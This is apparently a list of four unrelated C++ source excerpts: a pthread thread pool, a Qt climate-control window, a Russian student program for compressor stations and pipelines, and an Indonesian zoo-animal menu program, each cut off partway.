    "/****************************************************************\n *** THREADING SUPPORT\n ****************************************************************/\n\n// $Id$\n\n#include \"main.h\"\n\n#ifdef HAVE_PTHREAD\n#include \"threadpool.h\"\n\n/**\n * http://stackoverflow.com/questions/4264460/wait-for-one-of-several-threads-to-finish\n * Here is the algorithm to run the thread pool with a work queue:\n *\n * main:\n *     set freethreads to numthreads\n *     init mutex M, condvars TOMAIN and TOWORKER\n *     start N worker threads\n *     while true:\n *         wait for work item\n *         claim M\n *         while freethreads == 0:\n *             cond-wait TOMAIN, M\n *         put work item in queue\n *         decrement freethreads\n *         cond-signal TOWORKER\n *         release M\n * \n * worker:\n *     init\n *     while true:\n *         claim M\n *         while no work in queue:\n *             cond-wait TOWORKER, M\n *         get work to local storage\n *         release M\n *         do work\n *         claim M\n *         increment freethreads\n *         cond-signal TOMAIN\n *         release M\n */\n\n/* Return the number of CPUs we have on various architectures.\n * From http://stackoverflow.com/questions/150355/programmatically-find-the-number-of-cores-on-a-machine\n */\n\nint threadpool::numCPU()\n{\n    int numCPU=1;\t\t\t// default\n#ifdef WIN32\n    SYSTEM_INFO sysinfo;\n    GetSystemInfo( &sysinfo );\n    numCPU = sysinfo.dwNumberOfProcessors;\n#endif\n#if defined(HW_AVAILCPU) && defined(HW_NCPU)\n    int mib[4];\n    size_t len=sizeof(numCPU);\n\n    /* set the mib for hw.ncpu */\n    memset(mib,0,sizeof(mib));\n    mib[0] = CTL_HW;\n    mib[1] = HW_AVAILCPU;  // alternatively, try HW_NCPU;\n\n    /* get the number of CPUs from the system */\n    if(sysctl(mib, 2, &numCPU, &len, NULL, 0)){\n\tperror(\"sysctl\");\n    }\n\n    if( numCPU <= 1 ) {\n\tmib[1] = HW_NCPU;\n\tsysctl( mib, 2, &numCPU, &len, NULL, 0 );\n\tif( numCPU < 1 ) {\n\t    numCPU = 1;\n\t}\n    }\n#endif\n#ifdef _SC_NPROCESSORS_ONLN\n    numCPU = sysconf(_SC_NPROCESSORS_ONLN);\n#endif\n    return numCPU;\n}\n\n/*\n * ERR_QUIT prints an error message, gets it out and then quits.\n * It used to be 'ERR', but this created a conflict on some SunOS\n * and SunOS derivatives. See \n * http://dtrace.org/blogs/rm/2011/03/14/a-trip-down-into-sysregset-h/\n * for an example. On such systems 'ERR' is defined as '13'.\n */\n\nvoid ERR_QUIT(int val,const char *msg) __attribute__ ((__noreturn__));\nvoid ERR_QUIT(int val,const char *msg)\n{\n    std::cerr << msg << \"\\n\";\n    std::cerr.flush();\n    exit(val);\n}\n\n\n/* Run non-portable pthread win32 startup */\nvoid threadpool::win32_init()\n{\n#ifdef WIN32\n    static bool initialized = false;\n    if(initialized==false){\n//\tpthread_win32_process_attach_np();\n//\tpthread_win32_thread_attach_np();\n\tinitialized=true;\n    }\n#endif\n}\n\n\n/**\n * Create the thread pool.\n * Each thread has its own feature_recorder_set.\n *\n * From the pthreads readme for mingw:\n * Define PTW32_STATIC_LIB when building your application. Also, your\n * application must call a two non-portable routines to initialise the\n * some state on startup and cleanup before exit. One other routine needs\n * to be called to cleanup after any Win32 threads have called POSIX API\n * routines. See README.NONPORTABLE or the html reference manual pages for\n * details on these routines:\n * \n * BOOL pthread_win32_process_attach_np (void);\n * BOOL pthread_win32_process_detach_np (void);\n * BOOL pthread_win32_thread_attach_np (void); // Currently a no-op\n * BOOL pthread_win32_thread_detach_np (void);\n */\n\nthreadpool::threadpool(int numworkers_)\n{\n    numworkers\t\t= numworkers_;\n    freethreads\t\t= numworkers;\n    if(pthread_cond_init(&TOMAIN,NULL))   ERR_QUIT(1,\"pthread_cond_init #1 failed\");\n    if(pthread_cond_init(&TOWORKER,NULL)) ERR_QUIT(1,\"pthread_cond_init #2 failed\");\n\n    // lock while I create the threads\n    M.lock();\n    for(unsigned int i=0;i<numworkers;i++){\n\tclass worker *w = new worker(this,i);\n\tpush_back(w);\n\tpthread_create(&w->thread,NULL,worker::start_worker,(void *)w);\n    }\n    M.unlock();\n}\n\nthreadpool::~threadpool()\n{\n    /* We previously sent the termination message to all of the sub-threads here.\n     * However, their terminating caused wacky problems with the malloc library.\n     * So we just leave them floating around now. Doesn't matter much, because\n     * the main process will die soon enough.\n     */\n    kill_all_workers();\n    /* Release our resources */\n    pthread_cond_destroy(&TOMAIN);\n    pthread_cond_destroy(&TOWORKER);\n\n#ifdef WIN32\n//    pthread_win32_process_detach_np();\n//    pthread_win32_thread_detach_np();\n#endif\n\n\n}\n\n/*\n * Send the message to kill the workers through\n */\nvoid threadpool::kill_all_workers()\n{\n    M.lock();\n    int worker_count = numworkers;\n    M.unlock();\n    while(worker_count>0){\n\tthis->schedule_work(0);\n\tworker_count--;\n    }\n}\n\n/** \n * work is delivered in sbufs.\n * This blocks the caller if there are no free workers.\n */\nvoid threadpool::schedule_work(file_data_hasher_t *fdht)\n",
    "#include \"mainwindow.h\"\n#include \"ui_mainwindow.h\"\n#include \"optiondialog.h\"\n\n/**\n * @brief \u041a\u043e\u043d\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440 \u043a\u043b\u0430\u0441\u0441\u0430 MainWindow.\n *\n * @param parent \u0423\u043a\u0430\u0437\u0430\u0442\u0435\u043b\u044c \u043d\u0430 \u0440\u043e\u0434\u0438\u0442\u0435\u043b\u044c\u0441\u043a\u0438\u0439 \u0432\u0438\u0434\u0436\u0435\u0442.\n */\nMainWindow::MainWindow(QWidget *parent)\n    : QMainWindow(parent)\n    , ui(new Ui::MainWindow)\n    , temperature(0)\n    , humidity(0)\n    , pressure(0)\n    , initialTemperature(0)\n    , initialPressure(0)\n    , isConditioningSystem1Enabled(true)\n    , isConditioningSystem2Enabled(true)\n    , isConditioningSystem3Enabled(true)\n{\n    ui->setupUi(this);\n    ui->temp_label->setText(QString::number(temperature));\n    ui->pressure_label->setText(QString::number(pressure));\n\n    loadSettings();\n}\n\n/**\n * @brief \u0414\u0435\u0441\u0442\u0440\u0443\u043a\u0442\u043e\u0440 \u043a\u043b\u0430\u0441\u0441\u0430 MainWindow.\n */\nMainWindow::~MainWindow()\n{\n    saveSettings();\n    delete ui;\n}\n\n/**\n * @brief \u041e\u0431\u0440\u0430\u0431\u043e\u0442\u0447\u0438\u043a \u043d\u0430\u0436\u0430\u0442\u0438\u044f \u043a\u043d\u043e\u043f\u043a\u0438 \u0443\u0432\u0435\u043b\u0438\u0447\u0435\u043d\u0438\u044f \u0442\u0435\u043c\u043f\u0435\u0440\u0430\u0442\u0443\u0440\u044b.\n */\nvoid MainWindow::on_plus_clicked()\n{\n    initialTemperature += 1;\n    temperature = initialTemperature;\n\n    updateTemperatureDisplay();\n    saveSettings();\n}\n\n/**\n * @brief \u041e\u0431\u0440\u0430\u0431\u043e\u0442\u0447\u0438\u043a \u043d\u0430\u0436\u0430\u0442\u0438\u044f \u043a\u043d\u043e\u043f\u043a\u0438 \u0443\u043c\u0435\u043d\u044c\u0448\u0435\u043d\u0438\u044f \u0442\u0435\u043c\u043f\u0435\u0440\u0430\u0442\u0443\u0440\u044b.\n */\nvoid MainWindow::on_minus_clicked()\n{\n    initialTemperature -= 1;\n    temperature = initialTemperature;\n\n    updateTemperatureDisplay();\n    saveSettings();\n}\n\n\n/**\n * @brief \u041e\u0431\u0440\u0430\u0431\u043e\u0442\u0447\u0438\u043a \u043d\u0430\u0436\u0430\u0442\u0438\u044f \u043a\u043d\u043e\u043f\u043a\u0438 \u043d\u0430\u0441\u0442\u0440\u043e\u0435\u043a.\n */\nvoid MainWindow::on_option_button_clicked()\n{\n    optionDialog optionalDialog(this);\n\n    optionalDialog.setInitialValues(temperature, humidity, pressure);\n    ui->comboBoxTemp->setCurrentIndex(0);\n    ui->comboBoxPressure->setCurrentIndex(0);\n\n    if (optionalDialog.exec() == QDialog::Accepted) {\n        temperature = optionalDialog.getTemperature();\n        humidity = optionalDialog.getHumidity();\n        pressure = optionalDialog.getPressure();\n\n        initialTemperature = temperature;\n        initialPressure = pressure;\n\n        updateTemperatureDisplay();\n        updatePressureDisplay();\n        ui->humidity_label->setText(QString::number(humidity));\n        saveSettings();\n    }\n}\n\n/**\n * @brief \u041e\u0431\u0440\u0430\u0431\u043e\u0442\u0447\u0438\u043a \u0438\u0437\u043c\u0435\u043d\u0435\u043d\u0438\u044f \u0442\u0435\u043a\u0443\u0449\u0435\u0433\u043e \u0438\u043d\u0434\u0435\u043a\u0441\u0430 \u0432 \u0432\u044b\u043f\u0430\u0434\u0430\u044e\u0449\u0435\u043c \u0441\u043f\u0438\u0441\u043a\u0435 \u0442\u0435\u043c\u043f\u0435\u0440\u0430\u0442\u0443\u0440\u044b.\n *\n * @param index \u041d\u043e\u0432\u044b\u0439 \u0438\u043d\u0434\u0435\u043a\u0441.\n */\nvoid MainWindow::on_comboBoxTemp_currentIndexChanged(int index)\n{\n    updateTemperatureDisplay();\n}\n\n/**\n * @brief \u041e\u0431\u0440\u0430\u0431\u043e\u0442\u0447\u0438\u043a \u0438\u0437\u043c\u0435\u043d\u0435\u043d\u0438\u044f \u0442\u0435\u043a\u0443\u0449\u0435\u0433\u043e \u0438\u043d\u0434\u0435\u043a\u0441\u0430 \u0432 \u0432\u044b\u043f\u0430\u0434\u0430\u044e\u0449\u0435\u043c \u0441\u043f\u0438\u0441\u043a\u0435 \u0434\u0430\u0432\u043b\u0435\u043d\u0438\u044f.\n *\n * @param index \u041d\u043e\u0432\u044b\u0439 \u0438\u043d\u0434\u0435\u043a\u0441.\n */\nvoid MainWindow::on_comboBoxPressure_currentIndexChanged(int index)\n{\n    updatePressureDisplay();\n}\n\n/**\n * @brief \u041e\u0431\u043d\u043e\u0432\u043b\u044f\u0435\u0442 \u043e\u0442\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0435 \u0442\u0435\u043c\u043f\u0435\u0440\u0430\u0442\u0443\u0440\u044b \u0432 \u0437\u0430\u0432\u0438\u0441\u0438\u043c\u043e\u0441\u0442\u0438 \u043e\u0442 \u0432\u044b\u0431\u0440\u0430\u043d\u043d\u043e\u0439 \u0435\u0434\u0438\u043d\u0438\u0446\u044b \u0438\u0437\u043c\u0435\u0440\u0435\u043d\u0438\u044f.\n */\nvoid MainWindow::updateTemperatureDisplay()\n{\n    double convertedTemp = 0.0;\n    double currentTemp = initialTemperature;\n\n    switch (ui->comboBoxTemp->currentIndex()) {\n    case 0:\n        convertedTemp = currentTemp;\n        break;\n    case 1:\n        convertedTemp = (currentTemp * 9.0/5.0) + 32;\n        break;\n    case 2:\n        convertedTemp = currentTemp + 273.15;\n        break;\n    default:\n        break;\n    }\n\n    ui->temp_label->setText(QString::number(convertedTemp));\n\n    if (isConditioningSystem1Enabled) {\n        ui->labelTemp1->setText(QString::number(convertedTemp));\n    }\n    if (isConditioningSystem2Enabled) {\n        ui->labelTemp2->setText(QString::number(convertedTemp));\n    }\n    if (isConditioningSystem3Enabled) {\n        ui->labelTemp3->setText(QString::number(convertedTemp));\n    }\n}\n\n/**\n * @brief \u041e\u0431\u043d\u043e\u0432\u043b\u044f\u0435\u0442 \u043e\u0442\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0435 \u0434\u0430\u0432\u043b\u0435\u043d\u0438\u044f \u0432 \u0437\u0430\u0432\u0438\u0441\u0438\u043c\u043e\u0441\u0442\u0438 \u043e\u0442 \u0432\u044b\u0431\u0440\u0430\u043d\u043d\u043e\u0439 \u0435\u0434\u0438\u043d\u0438\u0446\u044b \u0438\u0437\u043c\u0435\u0440\u0435\u043d\u0438\u044f.\n */\nvoid MainWindow::updatePressureDisplay()\n{\n    double convertedPressure = 0.0;\n    double currentPressure = initialPressure;\n\n    switch (ui->comboBoxPressure->currentIndex()) {\n    case 0:\n        convertedPressure = currentPressure;\n        break;\n    case 1:\n        convertedPressure = currentPressure / 133.322;\n        break;\n    default:\n        break;\n    }\n\n    ui->pressure_label->setText(QString::number(static_cast<int>(convertedPressure)));\n\n    if (isConditioningSystem1Enabled) {\n        ui->labelPressure1->setText(QString::number(static_cast<int>(convertedPressure)));\n    }\n    if (isConditioningSystem2Enabled) {\n        ui->labelPressure2->setText(QString::number(static_cast<int>(convertedPressure)));\n    }\n    if (isConditioningSystem3Enabled) {\n        ui->labelPressure3->setText(QString::number(static_cast<int>(convertedPressure)));\n    }\n}\n\n/**\n * @brief \u0421\u043e\u0445\u0440\u0430\u043d\u044f\u0435\u0442 \u0442\u0435\u043a\u0443\u0449\u0438\u0435 \u043d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0438 \u0432 XML-\u0444\u0430\u0439\u043b.\n */\nvoid MainWindow::saveSettings()\n{\n    QFile file(\"settings.xml\");\n    if (!file.open(QIODevice::WriteOnly)) {\n        return;\n    }\n\n    QXmlStreamWriter writer(&file);\n    writer.setAutoFormatting(true);\n    writer.writeStartDocument();\n\n    writer.writeStartElement(\"Settings\");\n\n    writer.writeStartElement(\"Temperature\");\n    writer.writeAttribute(\"value\", QString::number(temperature));\n    writer.writeAttribute(\"unit\", QString::number(ui->comboBoxTemp->currentIndex()));\n    writer.writeEndElement();\n\n    writer.writeStartElement(\"Pressure\");\n    writer.writeAttribute(\"value\", QString::number(pressure)",
    "\ufeff#include <iostream>\n#include <string>\n#include <fstream>\n\nusing namespace std;\n\n\nclass KS\n\n\n{\n\n\nprivate:\n\tint workshopALL;\n\tint workshopWORK;\n\tint eff;\n\tstring nameKS;\n\npublic:\n\tKS() {};\n\tKS(int WALL, int WWORK, int e, string nn) :nameKS(nn), workshopALL(WALL), workshopWORK(WWORK), eff(e) {}\n\tfriend void outData();\n\n\n\n\n\tint addKS()\n\t{\n\t\tint newALL;\n\t\tint newWORK;\n\t\tint newEFF;\n\t\tstring newName;\n\n\t\tsystem(\"cls\");\n\n\t\tif ((workshopALL == 0) || (workshopWORK == 0) || (nameKS == \"\") || (eff == 0))\n\t\t{\n\t\t\tcout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0446\u0435\u0445\u043e\u0432: \";\n\t\t\tcin >> newALL;\n\t\t\tsystem(\"cls\");\n\t\t\tif (cin.fail() || cin.peek() != '\\n')\n\t\t\t{\n\t\t\t\tcin.clear();\n\t\t\t\tcin.ignore(1000, '\\n');\n\t\t\t\tsystem(\"cls\");\n\t\t\t\tcout << \"\u0412\u0432\u0435\u0434\u0435\u043d\u043e \u043d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u043e\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0446\u0435\u0445\u043e\u0432\\n\\n\";\n\t\t\t\treturn 1;\n\t\t\t}\n\n\t\t\telse\n\t\t\t{\n\t\t\t\tif (newALL > 0)\n\t\t\t\t\tworkshopALL = newALL;\n\t\t\t}\n\n\n\n\n\t\t\tcout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0440\u0430\u0431\u043e\u0447\u0438\u0445 \u0446\u0435\u0445\u043e\u0432: \";\n\t\t\tcin >> newWORK;\n\t\t\tsystem(\"cls\");\n\t\t\tif (cin.fail() || cin.peek() != '\\n')\n\t\t\t{\n\t\t\t\tcin.clear();\n\t\t\t\tcin.ignore(1000, '\\n');\n\t\t\t\tsystem(\"cls\");\n\t\t\t\tcout << \"\u0412\u0432\u0435\u0434\u0435\u043d\u043e \u043d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u043e\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0440\u0430\u0431\u043e\u0447\u0438\u0445 \u0446\u0435\u0445\u043e\u0432\\n\\n\";\n\t\t\t\treturn 1;\n\t\t\t}\n\n\t\t\telse\n\t\t\t{\n\t\t\t\tif ((newWORK > 0) && (newWORK <= workshopALL))\n\t\t\t\t\tworkshopWORK = newWORK;\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tcout << \"\u0412\u0432\u0435\u0434\u0435\u043d\u043e \u043d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u043e\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0440\u0430\u0431\u043e\u0447\u0438\u0445 \u0446\u0435\u0445\u043e\u0432\\n\\n\";\n\t\t\t\t\treturn 1;\n\t\t\t\t}\n\t\t\t}\n\n\n\n\n\t\t\tcout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043a\u043e\u044d\u0444\u0444\u0438\u0446\u0438\u0435\u043d\u0442 \u044d\u0444\u0444\u0435\u043a\u0442\u0438\u0432\u043d\u043e\u0441\u0442\u0438: \";\n\t\t\tcin >> newEFF;\n\t\t\tsystem(\"cls\");\n\t\t\tif (cin.fail() || cin.peek() != '\\n')\n\t\t\t{\n\t\t\t\tcin.clear();\n\t\t\t\tcin.ignore(1000, '\\n');\n\t\t\t\tsystem(\"cls\");\n\t\t\t\tcout << \"\u0412\u0432\u0435\u0434\u0451\u043d \u043d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u044b\u0439 \u043a\u043e\u044d\u0444\u0444\u0438\u0446\u0438\u0435\u043d\u0442 \u044d\u0444\u0444\u0435\u043a\u0442\u0438\u0432\u043d\u043e\u0441\u0442\u0438\\n\\n\";\n\t\t\t\treturn 1;\n\t\t\t}\n\n\t\t\telse\n\t\t\t{\n\t\t\t\tif (newEFF > 0)\n\t\t\t\t\teff = newEFF;\n\t\t\t}\n\n\n\n\n\t\t\tcin.clear();\n\t\t\tcout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0438\u043c\u044f: \";\n\t\t\tcin >> newName;\n\t\t\tif (newName != \"\")\n\t\t\t{\n\t\t\t\tnameKS = newName;\n\t\t\t\tsystem(\"cls\");\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tsystem(\"cls\");\n\t\t\t\tcout << \"\u0412\u0432\u0435\u0434\u0435\u043d\u043e \u043d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u043e\u0435 \u0438\u043c\u044f\\n\\n\";\n\t\t\t\treturn 1;\n\t\t\t}\n\n\n\n\n\n\t\t}\n\t\telse\n\t\t{\n\t\t\tcout << \"\u0423 \u0432\u0430\u0441 \u0443\u0436\u0435 \u0435\u0441\u0442\u044c \u041a\u0421\\n\\n\";\n\t\t\treturn 1;\n\t\t}\n\t}\n\n\tvoid changeName()\n\t{\n\t\tstring newName;\n\t\tif ((workshopALL == 0) || (workshopWORK == 0) || (nameKS == \"\") || (eff == 0))\n\t\t{\n\t\t\tsystem(\"cls\");\n\t\t\tcout << \"\u0423 \u0432\u0430\u0441 \u043d\u0435\u0442 \u041a\u0421\" << \"\\n\\n\";\n\t\t}\n\t\telse\n\t\t{\n\t\t\tsystem(\"cls\");\n\t\t\tcout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043d\u043e\u0432\u043e\u0435 \u0438\u043c\u044f: \";\n\t\t\tcin >> newName;\n\t\t\tsystem(\"cls\");\n\t\t\tif (newName != \"\")\n\t\t\t\tnameKS = newName;\n\t\t\telse\n\t\t\t{\n\t\t\t\tsystem(\"cls\");\n\t\t\t\tcout << \"\u0412\u0432\u0435\u0434\u0435\u043d\u043e \u043d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u043e\u0435 \u0438\u043c\u044f\";\n\t\t\t}\n\t\t}\n\n\n\t}\n\n\tvoid changeALL()\n\t{\n\t\tint newALL;\n\t\tif ((workshopALL == 0) || (workshopWORK == 0) || (nameKS == \"\") || (eff == 0))\n\t\t\tcout << \"\u0423 \u0432\u0430\u0441 \u043d\u0435\u0442 \u041a\u0421\" << \"\\n\";\n\t\telse\n\t\t{\n\t\t\tsystem(\"cls\");\n\t\t\tcout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043d\u043e\u0432\u043e\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0446\u0435\u0445\u043e\u0432: \";\n\t\t\tcin >> newALL;\n\t\t\tsystem(\"cls\");\n\t\t\tif (cin.fail() || cin.peek() != '\\n')\n\t\t\t{\n\t\t\t\tcin.clear();\n\t\t\t\tcin.ignore(1000, '\\n');\n\t\t\t\tcout << \"\u0412\u0432\u0435\u0434\u0435\u043d\u043e \u043d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u043e\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0446\u0435\u0445\u043e\u0432\\n\\n\";\n\t\t\t}\n\n\t\t\telse\n\t\t\t{\n\t\t\t\tif ((newALL > 0) && (newALL >= workshopWORK))\n\t\t\t\t\tworkshopALL = newALL;\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tcout << \"\u0412\u0432\u0435\u0434\u0435\u043d\u043e \u043d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u043e\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0446\u0435\u0445\u043e\u0432\\n\\n\";\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\tvoid changeWORK()\n\t{\n\t\tint newWORK;\n\t\tif ((workshopALL == 0) || (workshopWORK == 0) || (nameKS == \"\") || (eff == 0))\n\t\t\tcout << \"\u0423 \u0432\u0430\u0441 \u043d\u0435\u0442 \u041a\u0421\" << \"\\n\";\n\t\telse\n\t\t{\n\t\t\tsystem(\"cls\");\n\t\t\tcout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043d\u043e\u0432\u043e\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0440\u0430\u0431\u043e\u0447\u0438\u0445 \u0446\u0435\u0445\u043e\u0432: \";\n\t\t\tcin >> newWORK;\n\t\t\tsystem(\"cls\");\n\t\t\tif (cin.fail() || cin.peek() != '\\n')\n\t\t\t{\n\t\t\t\tcin.clear();\n\t\t\t\tcin.ignore(1000, '\\n');\n\t\t\t\tcout << \"\u0412\u0432\u0435\u0434\u0435\u043d\u043e \u043d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u043e\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0440\u0430\u0431\u043e\u0447\u0438\u0445 \u0446\u0435\u0445\u043e\u0432\\n\\n\";\n\t\t\t}\n\n\t\t\telse\n\t\t\t{\n\t\t\t\tif ((newWORK > 0) && (newWORK <= workshopWORK))\n\t\t\t\t\tworkshopALL = newWORK;\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tcout << \"\u0412\u0432\u0435\u0434\u0435\u043d\u043e \u043d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u043e\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0440\u0430\u0431\u043e\u0447\u0438\u0445 \u0446\u0435\u0445\u043e\u0432\\n\\n\";\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\tvoid changeEFF()\n\t{\n\t\tint newEFF;\n\t\tif ((workshopALL == 0) || (workshopWORK == 0) || (nameKS == \"\") || (eff == 0))\n\t\t{\n\t\t\tsystem(\"cls\");\n\t\t\tcout << \"\u0423 \u0432\u0430\u0441 \u043d\u0435\u0442 \u041a\u0421\" << \"\\n\\n\";\n\t\t}\n\t\telse\n\t\t{\n\t\t\tsystem(\"cls\");\n\t\t\tcout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043d\u043e\u0432\u044b\u0439 \u043a\u043e\u044d\u0444\u0444\u0438\u0446\u0438\u0435\u043d\u0442 \u044d\u0444\u0444\u0435\u043a\u0442\u0438\u0432\u043d\u043e\u0441\u0442\u0438: \";\n\t\t\tcin >> newEFF;\n\t\t\tsystem(\"cls\");\n\t\t\tif (cin.fail() || cin.peek() != '\\n')\n\t\t\t{\n\t\t\t\tcin.clear();\n\t\t\t\tcin.ignore(1000, '\\n');\n\t\t\t\tcout << \"\u0412\u0432\u0435\u0434\u0451\u0435 \u043d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u044b\u0439 \u043a\u043e\u044d\u0444\u0444\u0438\u0446\u0438\u0435\u043d\u0442 \u044d\u0444\u0444\u0435\u043a\u0442\u0438\u0432\u043d\u043e\u0441\u0442\u0438\\n\\n\";\n\t\t\t}\n\n\t\t\telse\n\t\t\t{\n\t\t\t\tif (newEFF > 0)\n\t\t\t\t\teff = newEFF;\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tcout << \"\u0412\u0432\u0435\u0434\u0451\u0435 \u043d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u044b\u0439 \u043a\u043e\u044d\u0444\u0444\u0438\u0446\u0438\u0435\u043d\u0442 \u044d\u0444\u0444\u0435\u043a\u0442\u0438\u0432\u043d\u043e\u0441\u0442\u0438\\n\\n\";\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\tvoid showInfoKS()\n\t{\n\t\tif ((workshopALL == 0) || (workshopWORK == 0) || (nameKS == \"\") || (eff == 0))\n\t\t{\n\t\t\tsystem(\"cls\");\n\t\t\tcout << \"\u0423 \u0432\u0430\u0441 \u043d\u0435\u0442 \u041a\u0421, \u0442\u0430\u043a \u043a\u0430\u043a \u0437\u0430\u0434\u0430\u043d\u043d\u044b\u0435 \u0434\u043b\u044f \u043d\u0435\u0451 \u0434\u0430\u043d\u043d\u044b\u0435 \u043d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u044b \" << \"\\n\" << \"\\n\";\n\t\t}\n\t\telse\n\t\t{\n\t\t\tsystem(\"cls\");\n\t\t\tcout << \"\u041f\u0430\u0440\u0430\u0435\u043c\u0442\u0440\u044b \u041a\u0421: \" << \"\\n\";\n\t\t\tcout << \"\u041d\u0430\u0437\u0432\u0430\u043d\u0438\u0435: \" << nameKS << \"\\n\";\n\t\t\tcout << \"\u0412\u0441\u0435\u0433\u043e \u0446\u0435\u0445\u043e\u0432: \" << workshopALL << \" \\n\";\n\t\t\tcout << \"\u0426\u0435\u0445\u043e\u0432 \u0432 \u0440\u0430\u0431\u043e\u0442\u0435: \" << workshopWORK << \" \\n\";\n\t\t\tcout << \"\u041a\u043e\u044d\u0444\u0444\u0438\u0446\u0438\u0435\u043d\u0442 \u044d\u0444\u0444\u0435\u043a\u0442\u0438\u0432\u043d\u043e\u0441\u0442\u0438: \" << eff << \" \\n\" << \"\\n\";\n\t\t}\n\n\t}\n\n\tvoid inData()\n\t{\n\t\tofstream in;\n\t\tin.open(\"data.txt\");\n\t\tif (in.is_open())\n\t\t{\n\n\t\t}\n\t}\n\n\n\n\n\n};\n\n\n\nclass pipeline\n{\nprivate:\n\tfloat length;\n\tfloat diametr;\n\tbool repair;\n\tstring name;\n\npublic:\n\tpipeline(float l, float d, bool r, string n) : length(l), diametr(d)",
    "#include <iostream>\r\n#include <string>\r\n\r\nusing namespace std;\r\n\r\n\r\nstruct Hewan {\r\n    string nama;\r\n    string jenis;\r\n    int umur;\r\n};\r\n\r\n\r\nvoid tambahHewan(Hewan* daftarHewan, int* jumlahHewan) {\r\n    if (*jumlahHewan < 100) {\r\n        cout << \"Masukkan nama hewan: \";\r\n        cin >> daftarHewan[*jumlahHewan].nama;\r\n        cout << \"Masukkan jenis hewan: \";\r\n        cin >> daftarHewan[*jumlahHewan].jenis;\r\n        cout << \"Masukkan umur hewan: \";\r\n        cin >> daftarHewan[*jumlahHewan].umur;\r\n        (*jumlahHewan)++;\r\n        cout << \"Hewan berhasil ditambahkan!\" << endl;\r\n    } else {\r\n        cout << \"Daftar hewan penuh!\" << endl;\r\n    }\r\n}\r\n\r\n\r\nvoid tampilkanHewan(Hewan* daftarHewan, int jumlahHewan) {\r\n    if (jumlahHewan == 0) {\r\n        cout << \"Belum ada hewan di dalam daftar.\" << endl;\r\n    } else {\r\n        cout << \"Daftar Hewan di Kebun Binatang:\" << endl;\r\n        for (int i = 0; i < jumlahHewan; i++) {\r\n            cout << i + 1 << \". Nama: \" << daftarHewan[i].nama\r\n                 << \", Jenis: \" << daftarHewan[i].jenis\r\n                 << \", Umur: \" << daftarHewan[i].umur << \" tahun\" << endl;\r\n        }\r\n    }\r\n}\r\n\r\n\r\nHewan* cariHewan(Hewan* daftarHewan, int jumlahHewan, string nama) {\r\n    for (int i = 0; i < jumlahHewan; i++) {\r\n        if (daftarHewan[i].nama == nama) {\r\n            return &daftarHewan[i];\r\n        }\r\n    }\r\n    return nullptr;\r\n}\r\n\r\n\r\nvoid hapusHewan(Hewan* daftarHewan, int* jumlahHewan, string nama) {\r\n    Hewan* hewanDitemukan = cariHewan(daftarHewan, *jumlahHewan, nama);\r\n    if (hewanDitemukan != nullptr) {\r\n        for (int i = hewanDitemukan - daftarHewan; i < *jumlahHewan - 1; i++) {\r\n            daftarHewan[i] = daftarHewan[i + 1];\r\n        }\r\n        (*jumlahHewan)--;\r\n        cout << \"Hewan berhasil dihapus!\" << endl;\r\n    } else {\r\n        cout << \"Hewan tidak ditemukan.\" << endl;\r\n    }\r\n}\r\n\r\nint main() {\r\n    Hewan daftarHewan[100]; \r\n    int jumlahHewan = 0; \r\n    int pilihan;\r\n    string namaHewan;\r\n\r\n    do {\r\n        cout << \"\\nMenu Kebun Binatang\" << endl;\r\n        cout << \"1. Tambah Hewan\" << endl;\r\n        cout << \"2. Tampilkan Daftar Hewan\" << endl;\r\n        cout << \"3. Cari Hewan\" << endl;\r\n        cout << \"4. Hapus Hewan\" << 